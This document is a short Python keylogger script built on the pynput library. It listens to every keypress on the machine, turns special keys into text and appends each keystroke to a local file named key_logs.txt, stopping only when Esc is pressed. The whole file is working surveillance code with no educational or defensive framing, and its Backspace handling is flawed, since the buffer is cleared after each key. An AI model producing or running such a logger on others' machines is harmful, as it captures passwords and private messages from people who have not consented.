from pynput import keyboard

# Defining the log file and the key-capture variable
log_file = "key_logs.txt"
text = ""

# Creating the event listener function
def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        exit()
    else:
        text += str(key).strip("'")

    with open(log_file, "a") as file:
        file.write('{0}'.format(text))

    text = ""

# Starting the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
